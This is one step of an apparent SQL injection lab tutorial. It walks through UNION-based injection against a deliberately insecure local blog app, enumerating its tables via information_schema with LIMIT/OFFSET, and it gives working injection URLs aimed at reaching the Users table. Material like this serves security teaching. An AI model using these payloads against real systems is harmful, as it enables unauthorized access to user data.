# (e) Get all tables

The plan here is to **list all the tables** of the target database (the database of this app).

The [information_schema](http://dev.mysql.com/doc/refman/5.7/en/information-schema.html) database we discussed in the previous step also store information about all the tables in every database of the server.

This information is stored in a table called **COLUMNS**.

So, to get all the tables of our database we have to query that *COLUMNS* table.
Let say our database is called **insecure_blog** (just like detailed in [env/development.json](../../env/development.json)). The query could be like this:
```shell
SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog'
```

where:
- **table_name** is the column where the tables get stored,
- **table_schema** is the column where the databases get stored.

> **Note:**
>   is important to use **distinct(table_name)** because there is one table_name for each column of each table. 
> This means that if one table has 10 columns will be 10 rows in the table_name column

The we inject the query in the browser:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog'),3,4,5,6,7,8,9/slug-name-post'
```

This query, just like in the previous step will return an error:
```javascript
{
  "status": "Error",
  "message": "ER_SUBQUERY_NO_1_ROW: Subquery returns more than 1 row"
}
```

We can use the same trick (LIMIT + OFFSET) to get the job done:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
```

And keep **increasing the OFFSET** to get all the tables.

If all went well, we will have 3 tables:

- Posts
- Comments
- Users

Of course we will focous in the **Users table**.

But this is for the next step.
that is it for now!!
